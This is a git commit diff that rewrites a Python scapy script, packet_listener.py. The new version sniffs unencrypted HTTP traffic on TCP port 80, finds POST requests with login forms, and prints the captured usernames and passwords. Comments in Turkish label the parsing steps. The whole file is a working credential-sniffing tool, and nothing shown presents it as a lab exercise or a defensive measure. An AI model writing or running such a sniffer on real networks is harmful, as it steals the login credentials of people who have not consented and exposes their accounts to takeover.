f716cc54d6c64f6953500e2b8d1289cc517949c4
Alperen <134652196+alprsb@users.noreply.github.com>
2023-06-12 13:33:02 +0300

    Update packet_listener.py

--- packet_listener.py
+++ packet_listener.py
@@ -1,15 +1,23 @@
-import scapy.all as scapy
-from scapy.layers import http
+from scapy.all import *
 
-def listening_packet(interface):
-    scapy.sniff(iface = interface,store=False,prn=analyze_packet)
-def analyze_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+def packet_handler(packet):
+    if packet.haslayer(TCP) and packet.haslayer(Raw):
+        try:
+            payload = packet[Raw].load.decode('utf-8')
+            if "POST" in payload and "username=" in payload:
+                payload = payload.split("\r\n\r\n")[1]  # İçeriği ayırma
+                params = payload.split("&")  # Parametreleri ayırma
+                username = ""
+                password = ""
+                for param in params:
+                    if param.startswith("username="):
+                        username = param.split("=")[1]
+                    elif param.startswith("password="):
+                        password = param.split("=")[1]
+                print("Username:", username)
+                print("Password:", password)
+                print("---------------")
+        except UnicodeDecodeError:
+            pass
 
-
-listening_packet("eth0")
-
-
-
+sniff(filter="tcp port 80", prn=packet_handler)
